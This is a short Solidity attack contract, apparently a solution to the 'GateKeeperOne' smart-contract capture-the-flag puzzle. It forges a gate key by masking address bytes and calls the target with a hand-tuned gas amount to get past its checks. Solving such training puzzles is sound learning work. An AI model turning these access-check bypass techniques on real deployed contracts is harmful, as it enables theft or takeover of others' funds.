// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Attack {
    GateKeeperOne gateKeeper;

    constructor(address _gateKeeper) {
        gateKeeper = GateKeeperOne(_gateKeeper);
    }

    // 0x8208b86dA007aa26 (last 4 bytes of addr)
    // 7747 (gas used found from debugger) + 57337 (8191 * 7)
    function enter(bytes8 addr) public {
        bytes8 key = addr & 0xFFFFFFFF0000FFFF;
        gateKeeper.enter{gas: 65084}(key);
    }
}

interface GateKeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}
